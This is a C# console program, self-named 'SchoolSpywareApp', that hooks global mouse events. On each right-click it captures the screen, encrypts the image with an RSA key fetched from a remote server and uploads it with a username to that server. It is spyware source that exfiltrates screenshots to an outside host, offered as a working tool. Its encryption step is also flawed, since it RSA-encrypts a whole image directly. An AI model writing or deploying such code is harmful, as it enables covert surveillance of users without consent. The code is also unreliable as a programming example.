using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Newtonsoft.Json;
using SchoolLibrary;

namespace SchoolSpywareApp
{
    internal class Program
    {
        private static HttpClient _httpClient = new HttpClient();
        private static RSA _rsa = RSA.Create();

        static async Task Main(string[] args)
        {
            RSACryptoServiceProvider.UseMachineKeyStore = true;
            DSACryptoServiceProvider.UseMachineKeyStore = true;

            if (args.Length != 2 || !args[0].Contains(':'))
            {
                string programName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
                Console.WriteLine("Usage: {0} <ip>:<port>", programName);
                return;
            }
            
            string[] fields = args[0].Split(':');
            string username = args[1];
            
            string ipAddress = fields[0];
            int port = Int32.Parse(fields[1]);
            
            _rsa.ImportFromPem(await GetPublicKeyPem(ipAddress, port));

            UriBuilder uriBuilder = new UriBuilder
            {
                Scheme = "http",
                Host = ipAddress,
                Port = port,
                Path = "api/image"
            };

            IKeyboardMouseEvents globalMouseHook = Hook.GlobalEvents();
            globalMouseHook.MouseDown += (sender, e) =>
            {
                if(e.Button == MouseButtons.Right)
                {
                    Bitmap bitmap = ImageLib.CaptureScreen();
                    SendImage(bitmap, uriBuilder.Uri, username);
                }
            };

            Application.Run();
        }

        private static async void SendImage(Bitmap bitmap, Uri requestUri, string username)
        {
            string json = JsonConvert.SerializeObject(new
            {
                time = DateTime.Now,
                username
            });
            StringContent jsonContent = new StringContent(json, Encoding.UTF8);
            jsonContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");

            byte[] imageBytes;

            using (MemoryStream memoryStream = new MemoryStream())
            {
                bitmap.Save(memoryStream, ImageFormat.Jpeg);
                imageBytes = memoryStream.ToArray();
            }

            imageBytes = _rsa.Encrypt(imageBytes, RSAEncryptionPadding.Pkcs1);

            ByteArrayContent imageContent = new ByteArrayContent(imageBytes);

            MultipartFormDataContent multipartContent = new MultipartFormDataContent();
            multipartContent.Add(jsonContent, "json", "info.json");
            multipartContent.Add(imageContent, "bitmap", "image.jpg");

            var response = await _httpClient.PostAsync(requestUri, multipartContent);

            Console.WriteLine(response);
            Console.WriteLine(await response.Content.ReadAsStringAsync());
        }

        private static async Task<string> GetPublicKeyPem(string ipAddress, int port)
        {
            UriBuilder uriBuilder = new UriBuilder
            {
                Scheme = "http",
                Host = ipAddress,
                Port = port,
                Path = "api/rsakey"
            };
            var response = await _httpClient.GetAsync(uriBuilder.Uri);
            var publicKeyPem = await response.Content.ReadAsStringAsync();

            Console.WriteLine(publicKeyPem);

            return publicKeyPem;
        }
    }
}
